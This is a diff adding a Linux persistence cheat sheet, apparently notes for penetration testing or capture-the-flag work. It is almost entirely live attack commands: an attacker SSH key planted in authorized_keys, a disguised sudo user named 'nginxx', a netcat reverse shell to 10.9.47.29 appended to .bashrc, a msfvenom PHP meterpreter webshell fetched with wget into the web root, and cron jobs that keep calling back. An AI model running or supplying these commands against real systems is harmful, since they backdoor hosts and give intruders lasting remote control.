@@ -1,0 +1,51 @@
+# Persistance Shortcuts
+## Linux Persisttance
+
+--> SSH
+#This technique requires Public Key Authentication to be enabled in the SSH configuration file
+ssh-keygen
+## pubkey [paste in remote /home/user/.ssh/authorized_keys.]
+## passphrase --> cyber2024
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP3G+EDZ0Sobw6Jq4MmoMoK1WuSSqJx8j4Pah1qhnyxpBLpnVPITMQi1BNQEfaSrBDXa0DGUJFli57O6g3MB+CLY74Be6nRsaFmQEPjdP4Gkruhxs46D3cF7dyhhNFaiKko7952UQp6LXGoznBs4s2mCS2TsyA3jJ8jnkTdnVUOcno4FrampL1/JA05z9HDQRO6C8em34jQaymPWLmWJkAiUXLTocFkAcN7B4AiOyFenv6AkcjS4iI4qRqLUJdQn3zxwDxcqdLYxpPCPwkAbtta/tSoEzlGDfFWurk7CsVE1pDK0x1lEyazIgoepOcWu2ZaJduTWvlOn/a5f63FxtUkK7pwJqhyNhMTyNxfHZEOfBXInDUL/WOMROtjwbhYJAvq+8PpXuK2CyAP0l9OYezC8kRfh2ZLjFOofRmw/fHeL9/e96HzoxofjKZlUFMnOuJwR+aqHuQQEW1B2iUQP+ueHTbMTe8rczQdvdqyU5cUM4g3bxxGQx1UfTlzHyGAHM= cyberxploit@parrot
+
+chmod 700 /root/.ssh
+chmod 600 /user/.ssh/authorized_keys
+
+--> Local Priviledged User
+useradd -m -s /bin/bash nginxx
+usermod -aG sudo nginxx
+passwd nginxx
+
+
+--> Unix Shell Config Mod
+echo "nc -e /bin/bash 10.9.47.29 9991 2>/dev/null &" >> ~/.bashrc
+vi ~/.bashrc
+nc -e /bin/bash 10.9.47.29 9991 2>/dev/null &
+
+
+--> WebShell
+## Locally
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.9.47.29 LPORT=4444 -e php/base64 -f raw > backup.php
+msfconsole
+use multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST 10.9.47.29
+set LPORT 4444
+run
+
+python3 -m http.server 8080
+
+## Remote
+cd /var/www/html/
+wget http://10.9.47.29:8080/backup.sh
+
+## Browser
+http://targetsIP/backup.php
+
+
+--> Cron Jobs
+## NetCat
+* * * * * nc 10.9.47.29 9991 -e /bin/sh
+## PHP
+* * * * * php -f /var/www/html/backup.php
